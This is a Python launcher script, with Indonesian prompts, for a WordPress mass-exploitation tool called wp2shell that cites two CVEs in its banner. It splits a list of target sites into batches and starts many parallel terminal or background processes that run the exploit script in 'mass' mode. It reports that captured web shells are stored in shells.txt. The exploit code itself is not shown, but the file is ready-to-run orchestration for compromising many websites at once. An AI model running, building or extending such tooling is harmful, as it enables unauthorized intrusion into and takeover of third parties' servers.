#!/usr/bin/env python3
"""
wp2shell_batch.py - Multi-Window Batch Launcher for wp2shell_async_master.py

Flow:
  1. Load list.txt -> Count total targets
  2. Ask: How many targets per batch?
  3. Split list into batch files (batch_1.txt, batch_2.txt, ...)
  4. Open multiple CMD windows simultaneously, each running wp2shell_async_master.py
  5. All windows run at the same time!
"""

import os
import sys
import math
import subprocess

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
MASTER_SCRIPT = os.path.join(SCRIPT_DIR, "wp2shell_async_master.py")
BATCH_DIR = os.path.join(SCRIPT_DIR, "batches")

# Colors
if os.name == "nt":
    os.system("")

G  = "\033[92m"; R  = "\033[91m"; Y  = "\033[93m"
B  = "\033[94m"; M  = "\033[95m"; CY = "\033[96m"
W  = "\033[97m"; BD = "\033[1m";  RS = "\033[0m"

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{BD}{M}
 __      __        ___   _____ _          _ _ 
 \\ \\    / /       |__ \\ / ____| |        | | |
  \\ \\  / /_ __  ___  ) | (___ | |__   ___| | |
   \\ \\/ /| '_ \\|_  // / \\___ \\| '_ \\ / _ \\ | |
    \\  / | |_) |/ // /_ ____) | | | |  __/ | |
     \\/  | .__/___|____|_____/|_| |_|\\___|_|_|
         | |    Multi-Window Batch Launcher
         |_|    CVE-2026-63030 + 60137      
{RS}""")

    # Step 1: Ask for list file
    list_file = input(f"{Y}[?]{RS} Masukkan path file target (e.g. list.txt): ").strip()
    if not os.path.isfile(list_file):
        print(f"{R}[-]{RS} File not found: {list_file}")
        sys.exit(1)

    with open(list_file, "r") as f:
        targets = [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]
    
    total = len(targets)
    print()
    print(f"{CY}[i]{RS} Total target ditemukan: {BD}{G}{total}{RS}")
    print()

    # Step 2: Ask user mode (Per Batch Size OR Total Batches)
    print(f"{CY}[1]{RS} Tentukan jumlah target per batch (e.g. 1000 targets/batch)")
    print(f"{CY}[2]{RS} Tentukan total jumlah batch/window (e.g. mau dibagi jadi 5 batch)")
    choice = input(f"{Y}[?]{RS} Pilih mode (1/2, default 2): ").strip() or "2"
    
    if choice == "1":
        batch_size = int(input(f"{Y}[?]{RS} Mau berapa target per batch? ").strip())
        total_batches = math.ceil(total / batch_size)
    else:
        total_batches = int(input(f"{Y}[?]{RS} Mau dibagi jadi berapa batch/window? ").strip())
        batch_size = math.ceil(total / total_batches)

    # Step 3: Ask threads per window
    threads_input = input(f"{Y}[?]{RS} Jumlah threads per window (default 15): ").strip()
    threads = int(threads_input) if threads_input else 15

    print()
    print(f"{CY}{'='*60}{RS}")
    print(f"  {BD}Konfigurasi Multi-Window Batch:{RS}")
    print(f"  Total Targets  : {G}{total}{RS}")
    print(f"  Total Batches  : {M}{total_batches}{RS} windows")
    print(f"  Batch Size     : {Y}{batch_size}{RS} targets per window")
    print(f"  Threads/Window : {B}{threads}{RS}")
    print(f"{CY}{'='*60}{RS}")
    print()

    confirm = input(f"{Y}[?]{RS} Langsung buka {total_batches} CMD window? (y/n): ").strip().lower()
    if confirm not in ("y", "yes", ""):
        print(f"{Y}[!]{RS} Dibatalkan.")
        sys.exit(0)

    # Step 4: Create batch directory & split files
    os.makedirs(BATCH_DIR, exist_ok=True)

    batch_files = []
    for batch_num in range(1, total_batches + 1):
        start_idx = (batch_num - 1) * batch_size
        end_idx = min(start_idx + batch_size, total)
        batch_targets = targets[start_idx:end_idx]

        batch_file = os.path.join(BATCH_DIR, f"batch_{batch_num}.txt")
        with open(batch_file, "w") as f:
            f.write("\n".join(batch_targets) + "\n")
        
        batch_files.append((batch_num, batch_file, len(batch_targets)))
        print(f"{G}[+]{RS} batch_{batch_num}.txt -> {len(batch_targets)} targets (line {start_idx+1}-{end_idx})")

    print()

    # Step 5: Launch multi-window/process across Windows, Linux, and macOS
    for batch_num, batch_file, count in batch_files:
        title = f"Batch_{batch_num}/{total_batches}"
        
        if os.name == "nt":
            # Windows: start new cmd window
            cmd = f'start "{title}" python "{MASTER_SCRIPT}" mass -l "{batch_file}" -t {threads}'
            subprocess.Popen(cmd, shell=True)
        else:
            # Linux / macOS
            # 1. Try gnome-terminal
            # 2. Try xterm
            # 3. Try tmux / screen
            # 4. Fallback to background process with nohup/subprocess
            launched = False
            
            # Check for GUI terminal emulators
            for term, term_cmd in [
                ("gnome-terminal", f'gnome-terminal --title="{title}" -- bash -c "python3 \'{MASTER_SCRIPT}\' mass -l \'{batch_file}\' -t {threads}; exec bash"'),
                ("konsole", f'konsole --new-tab -e bash -c "python3 \'{MASTER_SCRIPT}\' mass -l \'{batch_file}\' -t {threads}; exec bash"'),
                ("xterm", f'xterm -T "{title}" -e "python3 \'{MASTER_SCRIPT}\' mass -l \'{batch_file}\' -t {threads}; exec bash" &'),
                ("tmux", f'tmux new-window -n "{title}" "python3 \'{MASTER_SCRIPT}\' mass -l \'{batch_file}\' -t {threads}"'),
            ]:
                if subprocess.call(f"which {term} > /dev/null 2>&1", shell=True) == 0:
                    subprocess.Popen(term_cmd, shell=True)
                    launched = True
                    break
            
            if not launched:
                # VPS/CLI Headless Fallback: Run in background using python3 directly
                cmd = [sys.executable, MASTER_SCRIPT, "mass", "-l", batch_file, "-t", str(threads)]
                subprocess.Popen(cmd, cwd=SCRIPT_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print(f"{G}[+]{RS} Launched Batch {M}{batch_num}/{total_batches}{RS} ({count} targets)")

    print()
    print(f"{G}{'='*60}{RS}")
    print(f"{BD}{G}  {total_batches} CMD WINDOWS LAUNCHED!{RS}")
    print(f"{G}{'='*60}{RS}")
    print(f"  Semua window jalan bareng secara paralel!")
    print(f"  Shells tersimpan di: {CY}shells.txt{RS}")
    print(f"{G}{'='*60}{RS}")

if __name__ == "__main__":
    main()
